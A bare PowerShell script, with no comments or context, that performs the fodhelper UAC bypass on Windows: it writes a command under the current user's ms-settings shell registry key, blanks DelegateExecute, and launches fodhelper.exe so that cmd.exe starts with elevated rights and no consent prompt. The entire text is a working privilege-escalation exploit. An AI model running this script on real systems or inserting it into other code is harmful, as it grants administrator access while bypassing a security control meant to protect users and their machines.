$registryPath = 'HKCU:\Software\Classes\ms-settings\Shell\Open\command';
$command = 'cmd /c start cmd.exe';
$delegateExecute = '';

if (-not (Test-Path $registryPath)) {
    New-Item -Path $registryPath -Force | Out-Null;
}

Set-ItemProperty -Path $registryPath -Name '(Default)' -Value $command;
Set-ItemProperty -Path $registryPath -Name 'DelegateExecute' -Value $delegateExecute;

Start-Process 'C:\Windows\System32\fodhelper.exe' -Verb RunAs;